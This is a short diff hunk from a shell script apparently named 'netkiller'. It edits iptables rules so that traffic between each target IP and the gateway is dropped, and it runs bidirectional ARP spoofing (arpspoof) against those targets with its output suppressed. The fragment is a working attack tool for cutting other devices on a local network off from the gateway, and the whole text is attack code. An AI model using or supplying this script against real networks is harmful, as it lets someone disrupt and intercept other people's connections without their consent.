@@ -60,9 +60,9 @@ chmod 755 /bin/netkiller-stop
 
 for TARGET in $TARGET_IPS; do
     (
-       # Block all traffic except the device ip and gateway (bidirectional)
-        iptables -I FORWARD ! -s "$MYIP" -d "$GATEWAY" -j DROP
-        iptables -I FORWARD ! -s "$GATEWAY" -d "$MYIP" -j DROP
+       # Block a target ip traffic
+        iptables -I FORWARD -s "$TARGET" -d "$GATEWAY" -j DROP
+        iptables -I FORWARD -s "$GATEWAY" -d "$TARGET" -j DROP
 
       # Bidirectional Arp Spoofing
         arpspoof -i "$INTERFACE" -t "$TARGET" "$GATEWAY" >/dev/null 2>&1 &
